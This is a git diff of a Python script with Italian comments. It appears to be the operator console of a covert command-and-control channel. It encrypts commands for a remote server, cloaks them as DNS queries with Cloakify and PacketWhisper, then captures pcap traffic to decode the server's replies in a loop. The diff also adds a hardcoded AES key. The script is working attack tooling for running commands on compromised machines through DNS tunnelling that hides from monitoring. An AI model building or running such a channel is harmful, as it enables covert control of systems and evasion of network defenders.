@@ -1,11 +1,13 @@
 import subprocess
 import os
-from aes_encrypt import encrypt_message
+from decloakify import Decloakify
+from aes_encrypt import decrypt_message, encrypt_message
 from cloakify import Cloakify
-from packetWhisper import CloakAndTransferFile, TransferCloakedFile
+from scapy.all import sniff, wrpcap
+from packetWhisper import CloakAndTransferFile, ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries, TransferCloakedFile
 
 # Chiave AES (16, 24 o 32 byte)
-key = b'TuaChiaveAES32byteQui__AESKeyExample'[:32]
+key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
 cipher = "ciphers\\common_fqdn\\topWebsites"
 
 def send_command(command):
@@ -34,8 +36,54 @@ def send_command(command):
     # Rimuove il file dopo l'invio per evitare invii ripetuti
     os.remove(cloaked_command)
 
-if __name__ == "__main__":
-    command = input("Inserisci il comando da eseguire sul server: ")
-    send_command(command)
+def remove_dup_lines(file_input, file_output):
+    lines_seen = set() # holds lines already seen
+    outfile = open(file_output, "w")
+    for line in open(file_input, "r"):
+        if line not in lines_seen: # not a duplicate
+            outfile.write(line)
+            lines_seen.add(line)
+    outfile.close()
+    return file_output
+
+def receive_response():
+    print("Capturing pcap...")
+    subprocess.call(['python', 'pcapCapture.py']) 
+    print("pcap collected...")
+    dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_response.pcap", osStr="Windows")
+    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
+    cloaked_response = remove_dup_lines(cloakedFile, "_"+cloakedFile)
+    os.remove(cloakedFile)
+    os.rename("_"+cloakedFile, cloakedFile)
+    cloaked_response = cloakedFile #"cloaked.payload"
+    decloaked_response = "decloaked_response.txt"
     
+    with open(cloaked_response, 'r') as file:
+        if file.read().strip() == "":
+            print("No response received.")
+            return
+        
+    # Decloakificare il comando
+    print("Decloakifying...")
+    Decloakify(cloaked_response, cipher, decloaked_response)
+
+    # Decrypt command
+    with open(decloaked_response, 'r') as file:
+        encrypted_response = file.read().strip()
+    print("encrypted_response: ", encrypted_response)
+    response = encrypted_response#decrypt_message(encrypted_response, key)
+    print('response: ',response)
+    
+        
+
+    # Rimuove il file di comando dopo l'elaborazione
+    os.remove(cloaked_response)
+    os.remove(decloaked_response)
+
+
+if __name__ == "__main__":
+    while True:
+        command = input("Inserisci il comando da eseguire sul server: ")
+        send_command(command)
+        receive_response()
     
